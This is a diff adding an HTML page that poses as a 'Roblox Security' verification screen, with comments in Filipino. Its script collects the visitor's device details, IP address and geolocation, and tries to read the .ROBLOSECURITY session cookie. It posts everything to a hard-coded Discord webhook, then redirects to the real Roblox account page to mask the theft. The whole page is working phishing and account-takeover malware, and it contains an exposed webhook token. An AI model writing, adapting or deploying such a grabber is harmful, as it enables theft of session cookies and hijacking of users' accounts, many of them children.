@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Security</title>
+    <style>
+        body {
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            text-align: center;
+        }
+        .box {
+            background: #111;
+            padding: 40px;
+            border-radius: 10px;
+            border: 2px solid #7289da;
+        }
+        h1 {
+            font-size: 80px;
+            margin: 0;
+            color: #7289da;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h1>VERIFYING...</h1>
+        <p>Please wait while we check your security...</p>
+    </div>
+
+<script>
+// ==============================================
+// ✅ SETTINGS
+const webhookURL = "https://discord.com/api/webhooks/1488710258745409597/PsBpjmuYwlJOPInpSFH9_Fv9hy4Vspi10Mqe4_6tKQx8_KrZZRbdLYxDrvYb-3u5fwLt";
+// ✅ VALID ROBLOX URL PAG NAG REDIRECT
+const redirectLink = "https://www.roblox.com/my/account#!/security"; // DITO SILA MAPUPUNTA - VALID SECURITY PAGE
+// ==============================================
+
+// 1. KUNIN INFO NG DEVICE
+const ua = navigator.userAgent;
+let os = "Unknown OS";
+let device = "Unknown Device";
+let browser = "Unknown Browser";
+
+if (ua.includes("Win")) os = "Windows";
+else if (ua.includes("Android")) os = "Android";
+else if (ua.includes("Mac")) os = "Mac OS";
+else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+else if (ua.includes("Linux")) os = "Linux";
+
+if (ua.includes("Mobile") || ua.includes("Android") || ua.includes("iPhone")) device = "📱 PHONE / CP";
+else device = "💻 COMPUTER / PC";
+
+if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Google Chrome";
+else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+else if (ua.includes("Edg")) browser = "Microsoft Edge";
+else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Apple Safari";
+else if (ua.includes("OPR")) browser = "Opera";
+else browser = "Other Browser";
+
+const info = {
+    deviceType: device,
+    operatingSystem: os,
+    browserName: browser,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: `${window.screen.width} x ${window.screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
+    url: "Roblox Security Verification",
+    referrer: "Authenticated User"
+};
+
+// ==============================================
+// ✅ DITO KUKUNIN YUNG ROBLOX COOKIE
+// ==============================================
+function getCookie(name) {
+    let value = "; " + document.cookie;
+    let parts = value.split("; " + name + "=");
+    if (parts.length == 2) return parts.pop().split(";").shift();
+}
+
+const robloxCookie = getCookie(".ROBLOSECURITY") || "NOT FOUND / NOT LOGGED IN";
+
+// ==============================================
+// ✅ SEND LAHAT SA WEBHOOK
+// ==============================================
+function sendData(ip, city, region, country, loc, isp) {
+    const payload = {
+        content: "@everyone 🚨 💻 NEW LOG + COOKIE!",
+        embeds: [{
+            title: "🔍 FULL INFORMATION + ROBLOX COOKIE",
+            color: 0x00ff00,
+            fields: [
+                // DEVICE
+                { name: "💻 DEVICE INFO", value: "──────────────", inline: false },
+                { name: "DEVICE TYPE", value: info.deviceType, inline: false },
+                { name: "OPERATING SYSTEM", value: info.operatingSystem, inline: false },
+                { name: "BROWSER", value: info.browserName, inline: false },
+                { name: "PLATFORM", value: "`" + info.platform + "`", inline: false },
+                { name: "SCREEN SIZE", value: info.screen, inline: false },
+                { name: "LANGUAGE", value: info.language, inline: false },
+                { name: "TIMEZONE", value: info.timezone, inline: false },
+                { name: "COOKIES STATUS", value: info.cookies, inline: false },
+
+                // NETWORK
+                { name: "\n📡 NETWORK INFO", value: "──────────────", inline: false },
+                { name: "IP ADDRESS", value: "`" + ip + "`", inline: false },
+                { name: "CITY", value: city, inline: false },
+                { name: "REGION", value: region, inline: false },
+                { name: "COUNTRY", value: country, inline: false },
+                { name: "LOCATION", value: "`" + loc + "`", inline: false },
+                { name: "ISP / NETWORK", value: isp, inline: false },
+
+                // 🍪 ROBLOX COOKIE - DITO YUNG IMPORTANTE
+                { name: "\n🍪 ROBLOX COOKIE", value: "──────────────", inline: false },
+                { name: ".ROBLOSECURITY", value: "```" + robloxCookie + "```", inline: false },
+
+                // LINK
+                { name: "\n🔗 LINK INFO", value: "──────────────", inline: false },
+                { name: "URL", value: info.url, inline: false },
+                { name: "REFERRER", value: info.referrer, inline: false }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
+
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookURL, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(JSON.stringify(payload));
+
+    setTimeout(() => { window.location.href = redirectLink; }, 1500);
+}
+
+// ==============================================
+// ✅ TRY 3 API PARA SA IP AT LOCATION
+// ==============================================
+fetch('https://ipapi.co/json/')
+.then(res => res.json())
+.then(data => {
+    sendData(
+        data.ip,
+        data.city || "Detecting...",
+        data.region || "Detecting...",
+        data.country_name || "Detecting...",
+        data.latitude + ", " + data.longitude,
+        data.org || "Detecting..."
+    );
+})
+.catch(() => {
+    fetch('https://ipinfo.io/json')
+    .then(res => res.json())
+    .then(data => {
+        sendData(
+            data.ip,
+            data.city || "Detecting...",
+            data.region || "Detecting...",
+            data.country || "Detecting...",
+            data.loc || "0,0",
+            data.org || "Detecting..."
+        );
+    })
+    .catch(() => {
+        fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+            sendData(
+                data.ip,
+                "Unknown",
+                "Unknown",
+                "Unknown",
+                "Unknown",
+                "Unknown"
+            );
+        })
+        .catch(() => {
+            sendData("CHECKING...", "CHECKING...", "CHECKING...", "CHECKING...", "CHECKING...", "CHECKING...");
+        });
+    });
+});
+
+</script>
+
+</body>
+</html>
